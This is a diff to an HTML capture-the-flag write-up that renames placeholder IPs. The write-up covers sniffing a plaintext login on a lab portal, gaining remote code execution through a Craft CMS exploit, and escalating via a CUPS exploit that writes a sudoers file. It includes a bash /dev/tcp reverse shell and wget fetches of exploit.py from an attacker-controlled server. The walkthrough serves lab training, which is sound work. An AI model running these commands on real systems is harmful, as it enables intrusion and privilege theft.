@@ -92,7 +92,7 @@ sudo tshark -i mon0 \
           <p>After a few minutes we catch a plaintext HTTP login POST:</p>
           <pre><code>Running as user "root" and group "root". This could be dangerous.
 Capturing on 'mon0'
-<span class="ph">&lt;jump-server-ip&gt;</span>	<span class="ph">&lt;web-server-ip&gt;</span>	portal.international.htb	http://portal.international.htb/miles/login.php	username,password	jenny,<span class="ph">&lt;password&gt;</span></code></pre>
+<span class="ph">&lt;source-ip&gt;</span>	<span class="ph">&lt;web-server-ip&gt;</span>	portal.international.htb	http://portal.international.htb/miles/login.php	username,password	jenny,<span class="ph">&lt;password&gt;</span></code></pre>
           <p>Credentials for <code>jenny</code> leaked over the wire. Let's use them on the web portal.</p>
 
           <h3>Web Enum — Craft CMS</h3>
@@ -126,7 +126,7 @@ wget http://<span class="ph">&lt;attacker-ip&gt;</span>:8000/exploit.py</code></
   -u jenny \
   -p '<span class="ph">&lt;password&gt;</span>' \
   -c 'id' \
-  -H <span class="ph">&lt;jump-server-ip&gt;</span> --force</code></pre>
+  -H <span class="ph">&lt;wlan2-ip&gt;</span> --force</code></pre>
           <pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
           <p>RCE confirmed as <code>www-data</code>. Let's get a reverse shell:</p>
           <pre><code>nc -lnvp 9001</code></pre>
@@ -134,8 +134,8 @@ wget http://<span class="ph">&lt;attacker-ip&gt;</span>:8000/exploit.py</code></
   -b http://portal.international.htb \
   -u jenny \
   -p '<span class="ph">&lt;password&gt;</span>' \
-  -c 'bash -c "bash -i 5&lt;&gt;/dev/tcp/<span class="ph">&lt;jump-server-ip&gt;</span>/9001 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5"' \
-  -H <span class="ph">&lt;jump-server-ip&gt;</span> --force</code></pre>
+  -c 'bash -c "bash -i 5&lt;&gt;/dev/tcp/<span class="ph">&lt;wlan2-ip&gt;</span>/9001 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5"' \
+  -H <span class="ph">&lt;wlan2-ip&gt;</span> --force</code></pre>
 
           <div class="note-image">
             <img src="../src/images/layover/layover-5.png" alt="Reverse shell caught on nc listener" onclick="toggleZoom(this)">
@@ -209,7 +209,7 @@ python3 -m http.server</code></pre>
 wget http://<span class="ph">&lt;attacker-ip&gt;</span>:8000/exploit.py
 python3 -m http.server</code></pre>
           <pre><code># on the web server
-wget http://<span class="ph">&lt;jump-server-ip&gt;</span>:8000/exploit.py</code></pre>
+wget http://<span class="ph">&lt;wlan2-ip&gt;</span>:8000/exploit.py</code></pre>
           <p>Execute it — writing a <code>sudoers</code> drop-in for <code>aporter</code>:</p>
           <pre><code>CUPS_TARGET=/etc/sudoers.d/aporter-pwn CUPS_ATTACKER=aporter python3 exploit.py</code></pre>
           <pre><code>[+] SUCCESS
